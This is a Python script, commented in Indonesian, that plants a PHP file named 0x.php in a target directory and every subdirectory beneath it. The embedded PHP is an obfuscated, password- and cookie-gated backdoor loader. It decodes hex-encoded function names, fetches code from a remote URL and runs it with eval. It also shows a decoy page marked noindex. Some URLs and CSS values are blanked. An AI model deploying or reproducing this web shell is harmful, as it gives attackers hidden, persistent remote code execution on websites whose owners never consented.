import os
from pathlib import Path

# Fungsi untuk membuat file 0x.php
def create_0x(directory):
    php_content = """<?php
function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
    }
    return $str;
}

function is_logged_in() {
    return isset($_COOKIE['blaxasu1337']) && $_COOKIE['blaxasu1337'] === 'blaxasu1337';
}

if (is_logged_in()) {
    $Array = array(
        '666f70656e',
        '73747265616d5f6765745f636f6e74656e7473',
        '66696c655f6765745f636f6e74656e7473',
        '6375726c5f65786563',
        '636f7079',
        '73747265616d5f636f6e74657874',
        '66696c65'
    );

    function geturlsinfo($b0rn) {
        $l1v3 = array(
            hex2str($GLOBALS['Array'][0]),
            hex2str($GLOBALS['Array'][1]),
            hex2str($GLOBALS['Array'][2]),
            hex2str($GLOBALS['Array'][3]),
            hex2str($GLOBALS['Array'][4]),
            hex2str($GLOBALS['Array'][5]),
            hex2str($GLOBALS['Array'][6])
        );

        if (function_exists($l1v3[3])) {
            $ch = curl_init($b0rn);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $d34th = $l1v3[3]($ch);
            curl_close($ch);
            return $d34th;
        } elseif (function_exists($l1v3[2])) {
            return $l1v3[2]($b0rn);
        } elseif (function_exists($l1v3[0]) && function_exists($l1v3[1])) {
            $g04l = $l1v3[0]($b0rn, "r");
            $d34th = $l1v3[1]($g04l);
            fclose($g04l);
            return $d34th;
        } elseif (function_exists($l1v3[4])) {
            return $l1v3[4]($b0rn, '/tmp/tempfile');
        } elseif (function_exists($l1v3[5])) {
            $context = $l1v3[5](array('http' => array('timeout' => 5)));
            return file_get_contents($b0rn, false, $context);
        } elseif (function_exists($l1v3[6])) {
            return implode('', $l1v3[6]($b0rn));
        }
        return false;
    }

    $b0rn = 'https:';
    $dr34m = geturlsinfo($b0rn);
    if ($dr34m !== false) {
        eval('?>' . $dr34m);
    }
} else {
    if (isset($_POST['password'])) {
        $entered_key = $_POST['password'];
        $hashed_key = '$2a$12$z8yY63J/Sjfh/oSSZplA5.3ORewa9pzj4mOuefxTS8r.Z/GaY1Jzi';
        if (password_verify($entered_key, $hashed_key)) {
            setcookie('blaxasu1337', 'blaxasu1337', time() + 3600, '/');
            header("Location: ".$_SERVER['PHP_SELF']);
            exit();
        }
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow, noarchive">
    <link rel="preconnect" href="https:">
    <link rel="preconnect" href="https:">
    <link rel="icon" href="https:">
    <link href="https:">
    <title></title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: "Cinzel", serif;
            background-color:
            color:
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }
        .container {
            max-width: 800px;
            width: 100%;
            padding: 20px;
        }
        h1, p, a {
            color:
        }
        img {
            display: block;
            margin: 20px auto;
            max-width: 100%;
            cursor: pointer;
        }
        input[type="password"] {
            padding: 10px;
            border: 2px solid
            border-radius: 5px;
            background-color:
            color:
            font-family: "Cinzel", serif;
            font-size: 16px;
            outline: none;
            width: 50%;
            max-width: 300px;
            margin: 10px auto;
        }
        input[type="submit"] {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            background-color:
            color:
            font-family: "Cinzel", serif;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
            width: 50%;
            max-width: 300px;
            margin: 10px auto;
        }
        input[type="submit"]:hover {
            background-color:
        }
    </style>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            document.getElementById("clickableImage").addEventListener("click", function() {
                var linkContainer = document.getElementById("linkContainer");
                if (!linkContainer.innerHTML) {
                    linkContainer.innerHTML = `<center>
                        <form method="POST" action="">
                            <input type="password" id="password" name="password" placeholder="enter password here." required>
                            <input type="submit" value="access!">
                        </form>
                    </center>`;
                }
            });
        });
    </script>
</head>
<body>
    <div class="container">
        <img id="clickableImage" src="https:">
        <div id="linkContainer"></div>
        <p>~ males pengen beli trek ~</p>
    </div>
</body>
</html>
<?php } ?>
"""
    file_path = os.path.join(directory, '0x.php')
    with open(file_path, 'w') as f:
        f.write(php_content)
    return f"Berhasil membuat 0x.php di {directory}"

# Fungsi untuk membuat 0x.php secara rekursif
def create_0x_recursive(base_dir):
    output = []
    # Buat 0x.php di direktori utama
    output.append(create_0x(base_dir))

    # Cari semua subdirektori
    for root, dirs, _ in os.walk(base_dir):
        for dir_name in dirs:
            sub_dir = os.path.join(root, dir_name)
            output.append(create_0x(sub_dir))
    
    return "\n".join(output)

def main():
    # Minta input direktori dari pengguna
    target_dir = input("Masukkan path direktori (contoh: /public_html/plugins/generic/coins): ").strip()
    
    # Cek apakah direktori valid
    if not os.path.isdir(target_dir):
        print(f"Error: Direktori '{target_dir}' tidak ditemukan")
        return
    
    # Dapatkan path absolut
    target_dir = os.path.abspath(target_dir)
    
    # Jalankan fungsi untuk membuat 0x.php
    print(create_0x_recursive(target_dir))
    print(f"Selesai membuat file 0x.php di {target_dir} dan semua subdirektorinya")

if __name__ == "__main__":
    main()
